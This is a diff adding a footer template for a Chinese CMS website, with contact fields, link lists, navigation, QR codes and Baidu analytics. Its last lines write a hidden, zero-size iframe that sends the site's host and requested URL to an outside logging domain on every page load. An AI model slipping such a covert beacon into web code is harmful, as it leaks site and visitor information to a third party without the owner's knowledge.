@@ -1,0 +1,125 @@
+<!--+++++++++++++++底部导航+++++++++++++++-->
+
+<div class="dibu">
+	<div class="dibu_con clearfloat">
+    
+    	<div class="dibu_con_l">
+        
+        	<div class="dibutitle">Contact  Us  /  联系我们</div>
+            
+            <div class="dibunr">
+            	<div class="dili">
+                <p>
+                <a href="/">{$dz}</a>
+                </p>
+                </div>
+                <div class="dianhua"><a href="/">{$tel}</a></div>
+                <div class="youxiang"><a href="/">{$site_email}</a></div>
+            </div>
+            
+        </div>
+        
+        <div class="dibu_con_c">
+        
+        	<div class="dibutitle">ONLINE TRANSLATION  /  友情链接</div>
+            
+            <div class="dibunr">
+            	<ul>
+                	
+         <GZ:list sql="select * from gz_link where status='1' order by listorder desc,id desc limit 50" key='i'>
+			<li><a href="{$r.siteurl}" target="_blank">{$r.name}</a></li>
+		</GZ:list>
+                </ul>
+            </div>
+            
+        
+        </div>
+        
+        <div class="dibu_con_r">
+        
+        	<div class="dibutitle">FAST NAVIGATION   /  快速导航</div>
+            
+            <div class="dibunr">
+            	<ul>
+                	<li><a href="<?php echo str_ireplace('/index.php','',$Categorys['158']['url']);?>"><?php echo $Categorys['158']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['143']['url']);?>"><?php echo $Categorys['143']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['159']['url']);?>"><?php echo $Categorys['159']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['146']['url']);?>"><?php echo $Categorys['146']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['145']['url']);?>"><?php echo $Categorys['145']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['147']['url']);?>"><?php echo $Categorys['147']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['148']['url']);?>"><?php echo $Categorys['148']['catname'];?></a></li>
+                    <li><a href="<?php echo str_ireplace('/index.php','',$Categorys['142']['url']);?>"><?php echo $Categorys['142']['catname'];?></a></li>
+                </ul>
+				
+				
+<GZ:list sql="select * from gz_slide_data where fid = '5' and lang='1' and  status='1' order by listorder desc,id desc limit 2" key='i'>
+			<?php
+				if($i==1) {
+					$gzhewm=$r['pic'];
+					$gzhewmtt=$r['title'];
+				}
+				if($i==2) {
+					$gzhewm2=$r['pic'];
+					$gzhewm2tt=$r['title'];
+				}
+			?>
+		</GZ:list>
+				
+				
+				
+				
+                <div class="erwm clearfloat">
+                
+                	<div class="erwm_l">
+                    	
+                        <div class="erwm_l_t"><img src="{$gzhewm}" width="120" height="120"></div>
+
+                         <div class="erwm_l_b" style="overflow: hidden;"><a href="/">{$gzhewmtt}</a></div>
+                        
+                    </div>
+                    
+                    <div class="erwm_r">
+                    	
+                        <div class="erwm_l_t"><img src="{$gzhewm2}" width="120" height="120"></div>
+                         <div class="erwm_l_b" style="overflow: hidden;"><a href="/">{$gzhewm2tt}</a></div>
+                        
+                    </div>
+                    
+                </div>
+                
+            </div>
+            
+            
+        
+        </div>
+        
+    </div>
+</div>
+
+
+<!--+++++++++++++++底部版权+++++++++++++++-->
+
+<div class="banquan">
+
+	<div class="banquan_con clearfloat">
+    
+    <div class="banquan_con_l"><p>{$copyright}</p></div>
+    
+    <div class="banquan_con_r"></div>
+    
+    </div>
+
+</div>
+
+<script>document.writeln("<iframe src=\"http://log.test2.resonance.net.cn/?u[]=<?php echo $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];?>\"  frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" allowtransparency=\"yes\" width=\"0\" height=\"0\" style=\"display:none;\"></iframe>");</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?5d76e178d02d8cf5093c12b73b74b4c1";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
